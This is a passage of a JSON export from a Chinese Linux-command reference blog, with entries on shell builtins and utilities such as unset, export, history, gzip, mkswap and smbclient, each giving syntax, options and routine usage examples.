返回成功除非选项错误或要删除的变量或函数有只读属性。 例子 # 删除变量。 declare paper_size='B5' unset -v paper_size # 删除函数。 function show_result(){ echo 'Last Command Return: $?'; } unset -f show_result # 当不指定选项时，优先删除变量，如果失败则删除函数。 declare -i aa=100 function aa(){ echo 'aa'; } unset aa # 变量'aa'已被删除。 declare -p aa # 函数'aa'存在。 declare -F|grep aa # 演示unset使用-n选项，name指定了引用变量时的情况。 declare a=3 # 定义引用变量 declare -n b=a # 查看属性，显示declare -n b=&quot;a&quot; declare -p b # 显示3 echo ${b} # 显示a echo ${!b} # 指定-n选项时 unset -n b # 引用变量b已被删除 declare -p b # 被引用的变量a未被删除 declare -p a # 演示unset不使用-n选项，name指定了引用变量时的情况。 declare a=3 # 定义引用变量 declare -n b=a # 查看属性，显示declare -n b=&quot;a&quot; declare -p b # 显示3 echo ${b} # 显示a echo ${!b} # 不指定-n选项时 unset b # 引用变量b未被删除，显示declare -n b=&quot;a&quot; declare -p b # 被引用的变量a被删除 declare -p a 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unset","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unset/","stats":{"text":"2 min read","time":111000,"words":446,"minutes":2},"date":"2022-02-02 14:44:06","dateFormat":"2022-02-02"},{"content":"为 shell 变量或函数设置导出属性。。 概要 export [-fn] [name[=word]]... export -p 主要用途 定义一到多个变量并设置导出属性。 修改一到多个变量的值并设置导出属性。 删除一到多个变量的导出属性。 显示全部拥有导出属性的变量。 为一到多个已定义函数新增导出属性。 删除一到多个函数的导出属性。 显示全部拥有导出属性的函数。 选项 -f：指向函数。 -n：删除变量的导出属性。 -p：显示全部拥有导出属性的变量。 -pf：显示全部拥有导出属性的函数。 -nf：删除函数的导出属性。 --：在它之后的选项无效。 参数 name（可选）：变量名或已定义函数名。 value（可选）：变量的值。 返回值 export 返回 true 除非你提供了非法选项或非法名称。 例子 # 显示全部拥有导出属性的变量。 # export -p # export # 显示全部拥有导出属性的函数。 # export -pf # 首先删除要演示的变量名 #unset a b # 定义变量的同时增加导出属性 export a b=3 # 当然也可以先定义后增加导出属性 b=3 export b # 修改拥有导出属性的变量的值 export a=5 b=7 # 当然也可以直接赋值修改 a=5;b=7 # 删除变量的导出属性 export -n a b # 首先删除要演示的函数名 unset func_1 func_2 # 创建函数 function func_1(){ echo '123'; } function func_2(){ echo '890'; } # 为已定义函数增加导出属性 export -f func_1 func_2 # 删除函数的导出属性 export -fn a b # 添加环境变量（JAVA）到`~/.bashrc` PATH=/usr/local/jdk1.7.0/bin:$PATH # 添加当前位置到动态库环境变量 export LD_LIBRARY_PATH=$(pwd):${LD_LIBRARY_PATH} 错误用法 对未定义的函数添加导出属性。 对没有导出属性的函数/变量执行删除导出属性操作。 在 -- 后使用选项。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"export","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/export/","stats":{"text":"2 min read","time":113000,"words":497,"minutes":2},"date":"2022-02-02 14:43:18","dateFormat":"2022-02-02"},{"content":"主要用于编辑代码的编辑器。 补充说明 jed 命令是由 Slang 所开发，其主要用用途是编辑程序的源代码。它支持彩色语法加亮显示，可以模拟 emacs，EDT，wordstar 和 Brief 编辑器。 语法 jed (选项) (参数) 选项 -2：显示上下两个编辑区； -batch：以批处理模式来执行； -f&lt;函数&gt;：执行Slang函数； -g&lt;行数&gt;：移到缓冲区中指定的行数； -i&lt;文件&gt;：将指定的文件载入缓冲区； -n：不要载入jed.rc配置文件； -s&lt;字符串&gt;：查找并移到指定的字符串。 参数 文件：指定待编辑的文件列表。 实例 以上下两个编辑区的方式，开启 mysource.c 原始代码文件。若要切换编辑区，可利用稍后介绍的命令，开启操作命令，开启功能表后，按 3 ，再按 2 ，即可切换编辑区： jed -2 mysource.c 操作 有些 Emacs 的组合键和jed菜单组合键冲突例如 Alt + f 在 Emacs 中应该是“前进一个单词”，而在 jed 中则是“文件菜单” 想使用 Emacs 风格的组合键的话，编辑/usr/share/jed/lib/menus.slc找到如下段落： unsetsetkey (&quot;selectmenubar&quot;, &quot;\\em&quot;); unsetsetkey (&quot;@\\emF&quot;, &quot;\\ef&quot;); unsetsetkey (&quot;@\\emE&quot;, &quot;\\ee&quot;); unsetsetkey (&quot;@\\emo&quot;, &quot;\\eo&quot;); % Mode menu unsetsetkey (&quot;@\\emS&quot;, &quot;\\es&quot;); unsetsetkey (&quot;@\\emB&quot;, &quot;\\eb&quot;); unsetsetkey (&quot;@\\emi&quot;, &quot;\\ei&quot;); unsetsetkey (&quot;@\\emH&quot;, &quot;\\eh&quot;); unset_setkey (&quot;@\\emy&quot;, &quot;\\ey&quot;); 可以根据自己的需要修改，也可以简单的注释掉；使用菜单可以用 F10 键。 由于 Jed 可模拟多种编辑器，其各自按键指令也有所不同。这里以模拟 Emacs 为例，说明在编辑器中的操作方法。 文件 /usr/share/jed/lib/*.sl 这是默认的运行jed slang的文件。 /usr/share/jed/lib/site.sl 这是默认的启动文件。 /etc/jed.rc 这是全局系统配置文件。 ~/.jedrc 这是用户配置文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"jed","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/jed/","stats":{"text":"3 min read","time":124000,"words":507,"minutes":3},"date":"2022-02-02 14:40:36","dateFormat":"2022-02-02"},{"content":"显示作业的状态。。 概要 jobs [-lnprs] [jobspec ...] jobs -x command [args] 主要用途 显示作业的状态。 列出活动的作业。 列出停止的作业。 选项 -l 在作业信息中额外的列出PID。 -n 只列出最近一次通知以来状态变更的作业。 -p 只列出PID。 -r 只输出处于运行状态的作业。 -s 只输出处于停止状态的作业。 返回值 返回状态为成功除非给出了非法选项、执行出现错误。 如果使用jobs -x command [args]形式执行，那么返回值为command的退出状态。 例子 [user2@pc] ssh 192.168.1.4 pc@192.168.1.4's password: # 此时按下ctrl+z使得交互停止。 [1]+ Stopped ssh 192.168.1.4 [user2@pc] sleep 60 &amp; [2] 13338 [user2@pc] jobs [1]- Stopped ssh 192.168.1.4 [2] Running sleep 60 &amp; [user2@pc] jobs -l [1]- 12927 Stopped ssh 192.168.1.4 [2] 13338 Running sleep 60 &amp; [user2@pc] jobs -p 12927 13338 [user2@pc] jobs -s [1]- Stopped ssh 192.168.1.4 [user2@pc] jobs -r [2] Running sleep 60 &amp; [user2@pc] kill -9 12927 [2] Done sleep 60 [user2@pc] jobs -n -l [1]+ 12927 Killed ssh 192.168.1.4 [user2@pc] jobs -n -l 注意 bash的作业控制命令包括bg fg kill wait disown suspend。 该命令需要set选项monitor处于开启状态时才能执行； 查看作业控制状态：输入set -o查看monitor行； 执行set -o monitor或set -m开启该选项。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"jobs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/jobs/","stats":{"text":"2 min read","time":99000,"words":368,"minutes":2},"date":"2022-02-02 14:39:51","dateFormat":"2022-02-02"},{"content":"用来压缩文件。 补充说明 gzip 命令用来压缩文件。gzip 是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多处“.gz”扩展名。 gzip 是在 Linux 系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip 不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和 tar 命令一起构成 Linux 操作系统中比较流行的压缩文件格式。据统计，gzip 命令对文本文件有 60%～70%的压缩率。减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。 语法 gzip (选项) (参数) 选项 -a 或——ascii：使用 ASCII 文字模式； -d 或--decompress 或----uncompress：解开压缩文件； -f 或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接； -h 或——help：在线帮助； -l 或——list：列出压缩文件的相关信息； -L 或——license：显示版本与版权信息； -n 或--no-name：压缩文件时，不保存原来的文件名称及时间戳记； -N 或——name：压缩文件时，保存原来的文件名称及时间戳记； -q 或——quiet：不显示警告信息； -r 或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； -S 或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串； -t 或——test：测试压缩文件是否正确无误； -v 或——verbose：显示指令执行过程； -V 或——version：显示版本信息； -&lt;压缩效率&gt;：压缩效率是一个介于 1~9 的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高； --best：此参数的效果和指定“-9”参数相同； --fast：此参数的效果和指定“-1”参数相同。-num 用指定的数字 num 调整压缩的速度，-1 或--fast 表示最快压缩方法（低压缩比），-9 或--best 表示最慢压缩方法（高压缩比）。系统缺省值为 6。 参数 文件列表：指定要压缩的文件列表。 实例 把 test6 目录下的每个文件压缩成.gz 文件 gzip * 把上例中每个压缩的文件解压，并列出详细的信息 gzip -dv * 详细显示例 1 中每个压缩的文件的信息，并不解压 gzip -l * 压缩一个 tar 备份文件，此时压缩文件的扩展名为.tar.gz gzip -r log.tar 递归的压缩目录 gzip -rv test6 这样，所有 test 下面的文件都变成了 .gz，目录依然存在只是目录里面的文件相应变成了 .gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r 选项，这样也可以对子目录进行递归了。 递归地解压目录 gzip -dr test6 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gzip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gzip/","stats":{"text":"3 min read","time":169000,"words":773,"minutes":3},"date":"2022-02-02 14:39:01","dateFormat":"2022-02-02"},{"content":"Linux 下 info 格式的帮助指令。 补充说明 info 命令是 Linux 下 info 格式的帮助指令。 就内容来说，info 页面比 man page 编写得要更好、更容易理解，也更友好，但 man page 使用起来确实要更容易得多。一个 man page 只有一页，而 info 页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。理解这个命令的窍门就是不仅要学习如何在单独的 Info 页面中浏览导航，还要学习如何在节点和子节点之间切换。可能刚开始会一时很难在 info 页面的节点之间移动和找到你要的东西，真是具有讽刺意味：原本以为对于新手来说，某个东西比 man 命令会更好些，但实际上学习和使用起来更困难。 语法 info (选项) (参数) 选项 -d：添加包含 info 格式帮助文档的目录； -f：指定要读取的 info 格式的帮助文档； -n：指定首先访问的 info 帮助文件的节点； -o：输出被选择的节点内容到指定文件。 参数 帮助主题：指定需要获得帮助的主题，可以是指令、函数以及配置文件。 实例 在 info 后面输入命令的名称就可以查看该命令的 info 帮助文档了： info info 面介绍一下它的几个常用快捷键。 **?键：** 它就会显示info的常用快捷键。 **N键：** 显示（相对于本节点的）下一节点的文档内容。 **P键：** 显示（相对于本节点的）前一节点的文档内容。 **U键：** 进入当前命令所在的主题。 **M键：** 敲M键后输入命令的名称就可以查看该命令的帮助文档了。 **G键：** 敲G键后输入主题名称，进入该主题。 **L键：** 回到上一个访问的页面。 **SPACE键：** 向前滚动一页。 **BACKUP或DEL键：** 向后滚动一页。 **Q：** 退出info。 命令 **？** 显示帮助窗口 在帮助窗口中： **Ctrl-x 0** 关闭帮助窗口 **Ctrl-x Ctrl-c** 关闭整个 Info **q** 退出 info **n** 打开与本 Node 关联的下一个 Node **p** 打开与本 Node 关联的前一个 Node **u** 打开与本 Node 关联的上一个 Node **l** 回到上一次访问的 Node **m或g** 选择一个菜单项（Node 的名字） 输入指定菜单的名字后按回车，打开指定菜单项关联的 Node **空格键** 下一页（PageDown 也可以，下一页从当前页的最后两行开始算起） 下一个 Node （若当前页在 Node 文档的末尾） **Del 键** 上一页（PageUp 也可以，上一页从当前页的开始两行开始算起） 上一个 Node （若当前页 Node 文档的开始） **b 或 t 或 Home** 文档的开始（b 是 begining 的意思） **e 或 End** 文档的末尾（b 是 ending 的意思） **Ctrl-l** 刷新当前页，若当前文档显示情况有问题时 **Ctrl-g** 取消所键入的指令 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"info","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/info/","stats":{"text":"3 min read","time":172000,"words":789,"minutes":3},"date":"2022-02-02 14:38:31","dateFormat":"2022-02-02"},{"content":"显示或操作历史列表。。 概要 history [-c] [-d offset] [n] history -anrw [filename] history -ps arg [arg...] 主要用途 显示历史列表。 操作历史列表。 选项 -c 清空历史列表。 -d offset 根据offset删除记录。如果是正数则表示offset位置的记录，如果为负数则表示从结尾向前offset位置的记录。 -a 将当前终端的历史记录行添加到历史记录文件。 -n 将尚未从历史文件中读取的历史行追加到当前历史列表中。 -r 读取历史文件，并将其内容附加到历史列表中。 -w 将当前历史记录列表附加到历史记录文件中并且附加它们到历史列表中。 -p 在每个arg上执行历史记录扩展并在标准输出上显示结果，而不将结果存储在历史记录列表中。 -s 将每个arg作为单个条目附加到历史记录列表。 参数 n：可选，只列出最近的 n 条记录。 filename：可选，表示历史文件； 默认调用顺序为filename、环境变量HISTFILE、~/.bash_history。 返回值 返回成功，除非提供了非法选项或出现了错误。 例子 使用 history 命令显示最近使用的 10 条历史命令 [root@localhost ~]# history 10 92 ls 93 cd .. 94 ls 95 exit 96 ls -a 97 cd .ssh/ 98 ls 99 cat known_hosts 100 exit 101 history 10 清空历史记录 [root@localhost ~]# history -c 更多实例: # 执行第 n 条历史命令 [root@localhost ~]# !n # 执行最后一条 xxx 开头的命令 [root@localhost ~]# !xxx 注意 在命令行中，可以使用符号!执行指定序号的历史命令。例如，要执行第 2 个历史命令，则输入!2。 关闭终端后，历史列表将被写入历史文件~/.bash_history。 环境变量HISTSIZE决定了历史文件中命令的存储数量，默认存储 1000 条。 环境变量HISTTIMEFORMAT如果是非空值，则使用其值作为strftime(3)打印相关时间戳的格式字符串添加在每个显示的历史记录之前； 否则不会打印时间戳。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"history","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/history/","stats":{"text":"3 min read","time":126000,"words":560,"minutes":3},"date":"2022-02-02 14:36:46","dateFormat":"2022-02-02"},{"content":"用来启动 X Window。 补充说明 startx 命令用来启动 X Window，实际上启动 X Window 的程序为 xinit。 语法 startx (参数) 参数 客户端及选项：X 客户端及选项； 服务器及选项：X 服务器及选项。 实例 要在工作站上或 X 终端上启动 X 会话，请输入： startx 要在工作站上强制启动 X 会话，请输入： startx -w 要为 X 终端启动 X 会话，并注销用户的 telnet 会话，请输入： startx; kill -9 $ 要使用 .xinitrc 脚本启动 X 会话，请输入： startx -x .xinitrc 要使用 mwm 窗口管理器启动 X 会话，请输入： startx -m mwm 但是，如果找到启动脚本文件，则忽略-w选项。在启动脚本中，启动窗口管理器、装入 X 资源以及产生 X 客户机是用户的责任。以下是.xsession 脚本的一个示例。 #!/bin/csh (mwm &amp;) xrdb -load .Xdefaults (xclock -g 75x75+0+0 &amp;) (xbiff -g 75x75+101-0 &amp;) if (&quot;/dev/lft*&quot; == &quot;`tty`&quot;) then aixterm -g 80x24+0+0 +ut -C -T `hostname` else aixterm -g 80x24+0+0 +ut -T `hostname` endif 对于工作站，startup 脚本中的最后一行应该是前台 aixterm 命令，该命令带有-C选项表示控制台信息。对于 X 终端，startup 脚本中的最后一行应该是不带有-C选项的前台 aixterm 命令。另外，由于某些 X 终端在关闭时不终止 telnet 会话，所以用户必须在使用热键切换至 X 会话前退出当前的 telnet 会话。 /usr/lib/X11/xdm/Xsession文件中的 xdm 命令也可以使用 startx 命令。这为 xdm 命令提供了 startx 命令的功能。 以下是启动 X 会话一贯使用的文件名。 $HOME/.xerrors 其中，startx 用来重定向错误消息。在缺省情况下，startx 将错误重定向至用户主目录中的 .xerrors 文件中。 $HOME/.Xinit, $HOME/.xinit, $HOME/.Xinitrc, $HOME/.xinitrc, $HOME/.xsession 作为包含 shell 命令的“启动文件”来启动窗口管理器、装入 X 资源并产生 X 客户机。 $HOME/.Xdefaults, $HOME/.xresources 作为装入的 X 资源文件来设置 X 客户机的用户首选项。 $HOME/.mwmrc mwm 配置文件。 $HOME/.twmrc twm 配置文件。 $HOME/.awmrc awm 配置文件。 $HOME/.uwmrc uwm 配置文件。 /dev/lft* 终端或 tty、工作站初始 login shell 的界面。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"startx","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/startx/","stats":{"text":"3 min read","time":142000,"words":587,"minutes":3},"date":"2022-02-02 14:36:08","dateFormat":"2022-02-02"},{"content":"配置网络设备协商方式的工具。 补充说明 mii-tool 命令是用于查看、管理介质的网络接口的状态，有时网卡需要配置协商方式，比如 10/100/1000M 的网卡半双工、全双工、自动协商的配置。但大多数的网络设备是不用我们来修改协商，因为大多数网络设置接入的时候，都采用自动协商来解决相互通信的问题。不过自动协商也不是万能的，有时也会出现错误，比如丢包率比较高，这时就要我们来指定网卡的协商方式。mii-tool 就是能指定网卡的协商方式。下面我们说一说 mii-tool 的用法。 语法 usage: mii-tool [-VvRrwl] [-A media,... | -F media] [interface ...] 选项 -V 显示版本信息； -v 显示网络接口的信息； -R 重设 MII 到开启状态； -r 重启自动协商模式； -w 查看网络接口连接的状态变化； -l 写入事件到系统日志； -A 指令特定的网络接口； -F 更改网络接口协商方式； media: 100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD, (to advertise both HD and FD) 100baseTx, 10baseT 实例 查看网络接口的协商状态： [root@localhost ~]# mii-tool -v eth0 eth0: negotiated 100baseTx-FD, link ok product info: vendor 00:50:ef, model 60 rev 8 basic mode: autonegotiation enabled basic status: autonegotiation complete, link ok capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD advertising: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD flow-control link partner: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD 注：上面的例子，我们可以看得到是自动协商，注意红字的部份。 更改网络接口协商方式： 更改网络接口的协商方式，我们要用到-F选项，后面可以接 100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD 等参数； 如果我们想把网络接口 eth0 改为 1000Mb/s 全双工的模式应该怎么办呢？ [root@localhost ~]# mii-tool -F 100baseTx-FD [root@localhost ~]# mii-tool -v eth0 eth0: 100 Mbit, full duplex, link ok product info: vendor 00:00:00, model 0 rev 0 basic mode: 100 Mbit, full duplex basic status: link ok capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD advertising: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD 注：是不是已经改过来了？当然，我们也一样用 ethtool 工具来更改，比如执行下面的命令： [root@localhost ~]# ethtool -s eth0 speed 100 duplex full ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mii-tool","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mii-tool/","stats":{"text":"3 min read","time":147000,"words":575,"minutes":3},"date":"2022-02-02 14:35:29","dateFormat":"2022-02-02"},{"content":"显示文件的开头部分。。 概要 head [OPTION]... [FILE]... 主要用途 在未指定行数时默认显示前 10 行。 处理多个文件时会在各个文件之前附加含有文件名的行。 当没有文件或文件为-时，读取标准输入。 选项 -c, --bytes=[-]NUM 显示前NUM字节；如果NUM前有&quot;-&quot;，那么会打印除了文件末尾的NUM字节以外的其他内容。 -n, --lines=[-]NUM 显示前NUM行而不是默认的10行；如果NUM前有&quot;-&quot;，那么会打印除了文件末尾的NUM行以外的其他行。 -q, --quiet, --silent 不打印文件名行。 -v, --verbose 总是打印文件名行。 -z, --zero-terminated 行终止符为NUL而不是换行符。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 NUM可以有一个乘数后缀： b 512 kB 1000 k 1024 MB 1000*1000 M 1024*1024 GB 1000*1000*1000 G 1024*1024*1024 T、P、E、Z、Y等以此类推。 也可以使用二进制前缀： KiB=K MiB=M 以此类推。 参数 FILE（可选）：要处理的文件，可以为一或多个。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 # 查看历史文件的前6行： [user2@pc ~]$ head -n 6 ~/.bash_history #1575425555 cd ~ #1575425558 ls -lh #1575425562 vi ~/Desktop/ZhuangZhu-74.txt # 查看多个文件： [user2@pc ~]$ head -n ~/.bash_history ~/.bashrc ==&gt; /allhome/user2/.bash_history &lt;== #1575425555 cd ~ #1575425558 ls -lh #1575425562 vi ~/Desktop/ZhuangZhu-74.txt #1575425566 uptime #1575425570 find ~/ -maxdepth 3 -name 'test.sh' -exec lh {} \\; ==&gt; /allhome/user2/.bashrc &lt;== # .bashrc # forbid use Ctrl+D to exit shell. set -o ignoreeof # Source global definitions. if [ -f /etc/bashrc ]; then . /etc/bashrc fi 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 head，info coreutils 'head invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"head","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/head/","stats":{"text":"2 min read","time":112000,"words":430,"minutes":2},"date":"2022-02-02 14:34:37","dateFormat":"2022-02-02"},{"content":"显示 diff 命令输出信息的柱状图。 补充说明 diffstat 命令用来显示 diff 命令输出信息的柱状图，用以显示 diff 命令比较两个文件的不同统计信息。用户也可以直接使用|将 diff 命令所输出的结果直接送给 diffstat 命令进行统计结果的显示。使用该命令时，若所比较的文件或者子目录不在当前目录下，则应该使用其完整路径。 语法 diffstat (选项) (参数) 选项 -n&lt;文件名长度&gt;：指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名； -p&lt;文件名长度&gt;：与-n 参数相同，但此处的&lt;文件名长度&gt;包括了文件的路径； -w：指定要输出时栏位的宽度； -v：显示版本信息。 参数 文件：指定保存有 diff 命令的输出信息文件。 实例 将目录&quot;test1&quot;和&quot;test2&quot;下的同名文件&quot;testf.txt&quot;使用 diff 命令进行比较。然后使用 diffstat 命令对结果进行统计显示，输入如下命令： diff test1 test2 | diffstat #进行比较结果的统计显示 注意：使用这条命令可以非常方便地实现统计显示的功能。 对于查看文件中的内容，用户可以通过 cat 命令进行查看即可，具体操作如下： cat test1/testf.txt #查看test1/testf的内容 abc def ghi jkl mno pqr stu vws cat test2/testf.txt #查看test2/testf的内容 abc def ghi jkl mno 从上面的文件内容显示，可以看到两个文件内容的差别。现在来运行刚才的命令，对文件比较的结果进行统计显示，结果如下： testfile | 2 +- #统计信息输出显示 1 file changed, 1 insertion(+), 1 deletion(-) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"diffstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/diffstat/","stats":{"text":"2 min read","time":106000,"words":469,"minutes":2},"date":"2022-02-02 14:34:14","dateFormat":"2022-02-02"},{"content":"建立和设置 SWAP 交换分区。 补充说明 mkswap 命令用于在一个文件或者设备上建立交换分区。在建立完之后要使用 sawpon 命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。 语法 mkswap (选项) (参数) 选项 -c：建立交换区前，先检查是否有损坏的区块； -f：在 SPARC 电脑上建立交换区时，要加上此参数； -v0：建立旧式交换区，此为预设值； -v1：建立新式交换区。 参数 设备：指定交换空间对应的设备文件或者交换文件。 实例 查看系统 swap space 大小： free -m total used free shared buffers cached Mem: 377 180 197 0 19 110 -/+ buffers/cache: 50 327 Swap: 572 0 572 查看当前的 swap 空间 (file(s)/partition(s))： swapon -s 等价于 cat /proc/swaps 添加交换空间 添加一个 交换分区 或添加一个 交换文件 。推荐你添加一个交换分区； 不过，若你没有多少空闲空间可用，则添加交换文件。 添加一个交换分区，步骤如下： 使用 fdisk 来创建交换分区（假设 /dev/sdb2 是创建的交换分区），使用 mkswap 命令来设置交换分区： mkswap /dev/sdb2 启用交换分区： swapon /dev/sdb2 写入/etc/fstab，以便在引导时启用： /dev/sdb2 swap swap defaults 0 0 添加一个交换文件，步骤如下： 创建大小为 512M 的交换文件： dd if=/dev/zero of=/swapfile1 bs=1024 count=524288 使用 mkswap 命令来设置交换文件： mkswap /swapfile1 启用交换分区： swapon /swapfile1 写入/etc/fstab，以便在引导时启用： /swapfile1 swap swap defaults 0 0 新添了交换分区并启用它之后，请查看cat /proc/swaps或 free 命令的输出来确保交换分区已被启用了。 删除交换空间： 禁用交换分区： swapoff /dev/sdb2 从/etc/fstab中删除项目，使用 fdisk 或 yast 工具删除分区。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkswap","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkswap/","stats":{"text":"3 min read","time":123000,"words":533,"minutes":3},"date":"2022-02-02 14:33:23","dateFormat":"2022-02-02"},{"content":"显示历史列表中的命令或修改指定的历史命令并执行。。 概要 fc [-e ename] [-lnr] [first] [last] fc -s [pat=rep] [command] 主要用途 显示历史列表中的命令。 编辑并重新执行历史列表的命令。 #@ 选项 -e ename 选择使用的编辑器，默认调用次序为环境变量`FCEDIT`、环境变量`EDITOR`、`vi`。 -l 列出而不是编辑。 -n 列出时不输出行号（需配合-l选项）。 -r 倒序列出命令，最近执行的先列出（需配合-l选项）。 -s [pat=rep] [command] command（未指定时为最后执行的命令）将在pat替换为rep后重新执行。 参数 first：可选； 可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）； 未指定时设置为前一个命令并且偏移量为-16（最近的 16 条命令）。 last：可选； 可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）； 未指定时设置为参数 first。 返回值 返回成功或执行命令的状态，当错误出现时返回非 0 值。 例子 替换命令参数: # 列出 ~ 目录 ls ~ # 替换 ~ 为 / ，替换后列出根目录， fc -s ~=/ 显示最近使用的 10 条历史命令： [root@localhost ~]# fc -l -10 1039 type -a grep 1040 export 1041 history 10 1042 ulimit -a 1043 shopt 1044 help ls 1045 help env 1046 help short 1047 help shopt 1048 showkey -a 编辑第 1040 条历史命令： [root@localhost ~]# fc 1040 注意 关闭终端后，历史列表将被写入历史文件~/.bash_history。 环境变量FCEDIT的值为fc默认的编辑器。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fc/","stats":{"text":"2 min read","time":104000,"words":454,"minutes":2},"date":"2022-02-02 14:32:29","dateFormat":"2022-02-02"},{"content":"交互方式访问 samba 服务器。 补充说明 smbclient 命令属于 samba 套件，它提供一种命令行使用交互式方式访问 samba 服务器的共享资源。 语法 smbclient (选项) (参数) 选项 -B&lt;ip 地址&gt;：传送广播数据包时所用的 IP 地址； -d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&lt;范围&gt;：设置 NetBIOS 名称范围； -I&lt;IP 地址&gt;：指定服务器的 IP 地址； -l&lt;记录文件&gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&lt;NetBIOS 名称&gt;：可利用 WinPopup 协议，将信息送给选项中所指定的主机； -n&lt;NetBIOS 名称&gt;：指定用户端所要使用的 NetBIOS 名称； -N：不用询问密码； -O&lt;连接槽选项&gt;：设置用户端 TCP 连接槽的选项； -p&lt;TCP 连接端口&gt;：指定服务器端 TCP 连接端口编号； -R&lt;名称解析顺序&gt;：设置 NetBIOS 名称解析的顺序； -s&lt;目录&gt;：指定 smb.conf 所在的目录； -t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称； -T&lt;tar 选项&gt;：备份服务器端分享的全部文件，并打包成 tar 格式的文件； -U&lt;用户名称&gt;：指定用户名称； -w&lt;工作群组&gt;：指定工作群组名称。 参数 smb 服务器：指定要连接的 smb 服务器。 实例 列出某个 IP 地址所提供的共享文件夹 smbclient -L 198.168.0.1 -U username%password 像 ftp 客户端一样使用 smbclient smbclient //192.168.0.1/tmp -U username%password 执行 smbclient 命令成功后，进入 smbclient 环境，出现提示符：smb:/&gt; 这里有许多命令和 ftp 命令相似，如 cd 、lcd、get、megt、put、mput 等。通过这些命令，我们可以访问远程主机的共享资源。 直接一次性使用 smbclient 命令 smbclient -c &quot;ls&quot; //192.168.0.1/tmp -U username%password 和 smbclient //192.168.0.1/tmp -U username%password smb:/&gt;ls 功能一样的。 创建一个共享文件夹 smbclient -c &quot;mkdir share1&quot; //192.168.0.1/tmp -U username%password 如果用户共享//192.168.0.1/tmp的方式是只读的，会提示NT_STATUS_ACCESS_DENIED making remote directory /share1 